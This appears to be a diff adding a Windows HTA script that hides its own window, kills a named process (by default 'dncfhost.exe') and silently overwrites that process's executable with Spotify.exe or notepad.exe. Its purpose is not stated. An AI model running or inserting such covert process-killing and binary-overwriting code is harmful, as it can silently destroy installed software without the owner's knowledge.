@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html>
+<head>
+<HTA:APPLICATION
+    ID="SD"
+    APPLICATIONNAME="SD"
+    BORDER="none"
+    BORDERSTYLE="none"
+    CAPTION="no"
+    MAXIMIZEBUTTON="no"
+    MINIMIZEBUTTON="no"
+    SHOWINTASKBAR="no"
+    SINGLEINSTANCE="yes"
+    SYSMENU="no"
+    WINDOWSTATE="minimize"
+    SCROLL="no"
+/>
+<title></title>
+<style>
+body { margin: 0; padding: 0; background: transparent; }
+</style>
+</head>
+<body>
+
+<script type="text/vbscript">
+Function GetProcessByName(pn)
+    On Error Resume Next
+    Dim o, c, p, f
+    f = False
+    Set o = GetObject("winmgmts:\\.\root\cimv2")
+    Set c = o.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & pn & "'")
+    For Each p in c
+        f = True
+        Exit For
+    Next
+    GetProcessByName = f
+End Function
+
+Function GetProcessPath(pn)
+    On Error Resume Next
+    Dim o, c, p
+    Set o = GetObject("winmgmts:\\.\root\cimv2")
+    Set c = o.ExecQuery("SELECT ExecutablePath FROM Win32_Process WHERE Name = '" & pn & "'")
+    For Each p in c
+        If Not IsNull(p.ExecutablePath) Then
+            GetProcessPath = p.ExecutablePath
+            Exit Function
+        End If
+    Next
+    GetProcessPath = ""
+End Function
+
+Function KillProcessByName(pn)
+    On Error Resume Next
+    Dim o, c, p
+    Set o = GetObject("winmgmts:\\.\root\cimv2")
+    Set c = o.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & pn & "'")
+    For Each p in c
+        p.Terminate()
+    Next
+End Function
+
+Function BinaryCopy(sf, tf)
+    On Error Resume Next
+    Dim a, b, fso, tfo
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    If Not fso.FileExists(sf) Then
+        BinaryCopy = False
+        Exit Function
+    End If
+    If Not fso.FileExists(tf) Then
+        BinaryCopy = False
+        Exit Function
+    End If
+    Set tfo = fso.GetFile(tf)
+    If tfo.Attributes And 1 Then
+        tfo.Attributes = tfo.Attributes - 1
+    End If
+    Set a = CreateObject("ADODB.Stream")
+    a.Type = 1
+    a.Open
+    a.LoadFromFile sf
+    b = a.Read
+    a.Close
+    a.Open
+    a.Type = 1
+    a.Write b
+    a.SaveToFile tf, 2
+    a.Close
+    BinaryCopy = True
+End Function
+</script>
+
+<script type="text/javascript">
+window.resizeTo(1,1);
+window.moveTo(-2000,-2000);
+
+function p() {
+    try {
+        var w = new ActiveXObject("WScript.Shell");
+        var e = w.Environment("Process");
+        var c = e("CMDLINE");
+        var m = c.match(/--name\s+(\S+)/i);
+        if (m) return m[1];
+    } catch(x) {}
+    return "dncfhost.exe";
+}
+
+function fs() {
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+    var sh = new ActiveXObject("WScript.Shell");
+    try {
+        var ap = sh.ExpandEnvironmentStrings("%APPDATA%");
+        var sp = fso.BuildPath(ap, "Spotify\\Spotify.exe");
+        if (fso.FileExists(sp)) return sp;
+    } catch(x) {}
+    return "C:\\Windows\\System32\\notepad.exe";
+}
+
+function w(pn, cb) {
+    var i = window.setInterval(function() {
+        var r = GetProcessByName(pn);
+        if (!r) {
+            clearInterval(i);
+            cb();
+        }
+    }, 1000);
+    window.setTimeout(function() {
+        clearInterval(i);
+        cb();
+    }, 30000);
+}
+
+function ex() {
+    var pn = p();
+    var tf = GetProcessPath(pn);
+    
+    if (!tf || tf === "") {
+        window.close();
+        return;
+    }
+    
+    var sf = fs();
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+    
+    if (!fso.FileExists(sf) || !fso.FileExists(tf)) {
+        window.close();
+        return;
+    }
+    
+    try { KillProcessByName(pn); } catch(x) {}
+    
+    window.setTimeout(function() {
+        var sr = GetProcessByName(pn);
+        if (sr) {
+            w(pn, function() { r(); });
+        } else {
+            r();
+        }
+    }, 2000);
+    
+    function r() {
+        try {
+            BinaryCopy(sf, tf);
+        } catch(x) {}
+        window.setTimeout(function() { window.close(); }, 100);
+    }
+}
+
+window.onload = function() {
+    window.setTimeout(function() { ex(); }, 100);
+};
+</script>
+
+</body>
+</html>
